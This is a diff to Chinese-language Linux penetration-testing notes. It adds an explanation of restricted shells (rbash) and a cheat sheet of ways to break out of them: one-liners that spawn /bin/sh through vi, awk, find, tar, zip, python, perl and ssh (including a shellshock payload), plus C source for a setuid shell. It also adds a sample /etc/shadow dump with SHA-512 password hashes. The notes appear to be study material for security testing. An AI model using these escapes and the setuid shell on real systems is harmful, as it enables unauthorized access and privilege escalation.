@@ -16,6 +16,89 @@
 - 主机名 ``hostname``
 - 文件系统 ``df -a``
 - 内核日志 ``dmesg`` / ``/var/log/dmesg``
+- 查看当前shell ``echo $0``
+	
+	::
+	
+		Restricted Shell
+		使用“rbash”，“ - restricted”，“ - r”选项启动任何现有的shell，那么它将成为Restricted shell。
+		Restricted Shell将限制用户执行大多数命令和更改当前工作目录。Restricted Shell将对用户施加以下限制。
+		1.它不允许您执行cd命令。所以你不能去任何地方。您可以简单地留在当前的工作目录中。
+		2.它不允许您修改  $ PATH，$ SHELL，$ BASH_ENV或$ ENV环境变量的值。
+		3.它不允许您执行包含/（斜杠）字符的程序。例如，您无法运行/ usr / bin / uname或./uname命令。但是，您可以执行uname命令。换句话说，您只能在当前路径中运行命令。
+		4.您无法使用'重定向输出'>'，'> |'，'<>'，'>＆'，'＆>'，'和'>>'重定向运算符。
+		5.它不允许您在脚本中退出受限制的shell模式。
+		6.它不允许您使用'set + r'或'set + o restricted'关闭受限制的shell模式。
+		常见的受限制 shell 有:rbash、rksh、rsh、lshell.
+- 突破受限shell
+	- 枚举Linux环境
+		
+	::
+	
+		枚举是找到突破方法的重要组成部分。我们需要枚举Linux环境来检测为了绕过rbash我们可以做哪些事。
+		在正式进行绕过测试之前,我们需要进行以下操作:
+		1、首先,我们必须检查可用命令,像cd、ls、echo等
+		2、接下来我们要检查常见的操作符,像>、>>、<、|
+		3、然后对可用的编程语言进行检查,如perl、ruby、python等
+		4、通过sudo -l命令检查我们可以使用root权限运行哪些命令
+		5、使用SUID perm检查文件或命令。
+		6、使用echo $SHELL命令检查当前使用的是什么shell(90%得到的结果是rbash)
+		7、使用env或者printenv命令检查环境变量
+		通过以上操作,我们已收集到一些游泳的信息,接下来尝试一下通用的利用方法。
+		
+	- 通用利用技巧
+
+	::
+	
+		1、如果"/"命令可用的话,运行/bin/sh或者/bin/bash
+		2、运行cp命令,将/bin/sh或者/bin/bash复制到当前目录
+		3、在ftp中运行!/bin/sh或者!/bin/bash,如下图所示
+		4、在gdb中运行!/bin/sh或者!/bin/bash
+		5、在more、man、less中运行!/bin/sh或者!/bin/bash
+		6、在vim/vi中运行!/bin/sh或者!/bin/bash
+		7、在rvim中执行:python import os; os.system("/bin/bash )
+		8、scp -S /path/yourscript x y:
+		9、awk 'BEGIN {system("/bin/sh or /bin/bash")}'
+		10、find / -name test -exec /bin/sh or /bin/bash \;
+		
+	- 编程语言技巧
+	
+	::
+	
+		1、使用except spawn
+		2、python -c 'import os; os.system("/bin/sh")'
+		3、php -a then exec("sh -i");
+		4、perl -e 'exec "/bin/sh";'
+		5、Lua:os.execute('/bin/sh').
+		6、ruby:exec "/bin/sh"
+		7、python: echo os.system('/bin/bash')
+		
+	- 高级利用技巧
+	
+	::
+	
+		1、ssh username@IP – t "/bin/sh" or "/bin/bash"
+		2、ssh username@IP -t "bash –noprofile"
+		3、ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
+		4、ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)
+		5、git帮助状态下通过!/bin/bash进入交互式shell
+		6、pico -s "/bin/bash"进入编辑器写入/bin/bash然后按ctrl + T键
+		7、zip /tmp/test.zip /tmp/test -T –unzip-command="sh -c /bin/bash"
+		8、tar cf /dev/null testfile –checkpoint=1 –checkpointaction=exec=/bin/bash
+		9、c setuid shell:
+		#include <stdlib.h>
+		#include <unistd.h>
+		#include <stdio.h>
+		int main(int argc,char **argv,char **envp)
+		{
+			setresgid(getegid(),getegid(),getegid());
+			setresuid(geteuid(),geteuid(),geteuid());
+			
+		 execve("/bin/sh",argv,envp);
+		 return 0;
+		}
+			
+	- ``ssh guest@x.x.x.x -t "python -c 'import pty;pty.spawn(\"/bin/bash\")'"``
 
 用户和组
 ----------------------------------------
@@ -56,6 +139,48 @@
 
 - 列出系统所有组 ``cat /etc/group``
 - 列出所有用户hash（root）``cat /etc/shadow``
+	::
+	
+		root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::
+		daemon:*:18440:0:99999:7:::
+		bin:*:18440:0:99999:7:::
+		sys:*:18440:0:99999:7:::
+		sync:*:18440:0:99999:7:::
+		games:*:18440:0:99999:7:::
+		man:*:18440:0:99999:7:::
+		lp:*:18440:0:99999:7:::
+		mail:*:18440:0:99999:7:::
+		news:*:18440:0:99999:7:::
+		uucp:*:18440:0:99999:7:::
+		proxy:*:18440:0:99999:7:::
+		www-data:*:18440:0:99999:7:::
+		backup:*:18440:0:99999:7:::
+		list:*:18440:0:99999:7:::
+		irc:*:18440:0:99999:7:::
+		gnats:*:18440:0:99999:7:::
+		nobody:*:18440:0:99999:7:::
+		_apt:*:18440:0:99999:7:::
+		systemd-timesync:*:18440:0:99999:7:::
+		systemd-network:*:18440:0:99999:7:::
+		systemd-resolve:*:18440:0:99999:7:::
+		messagebus:*:18440:0:99999:7:::
+		avahi-autoipd:*:18440:0:99999:7:::
+		sshd:*:18440:0:99999:7:::
+		avahi:*:18440:0:99999:7:::
+		saned:*:18440:0:99999:7:::
+		colord:*:18440:0:99999:7:::
+		hplip:*:18440:0:99999:7:::
+		systemd-coredump:!!:18440::::::
+		296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::
+		
+		文件的格式为：{用户名}：{加密后的口令密码}：{口令最后修改时间距原点(1970-1-1)的天数}：{口令最小修改间隔(防止修改口令，如果时限未到，将恢复至旧口令)：{口令最大修改间隔}：{口令失效前的警告天数}：{账户不活动天数}：{账号失效天数}：{保留}
+		其中{加密后的口令密码}的格式为 $id$salt$encrypted
+		id为1时，采用md5算法加密
+		id为5时，采用SHA256算法加密
+		id为6时，采用SHA512算法加密
+		salt为盐值,是对密码进行hash的一个干扰值
+		encrypted为散列值
+	
 - 用户
     - 查询用户的基本信息 ``finger``
     - 当前登录的用户 ``users`` ``who -a`` ``/var/log/utmp``
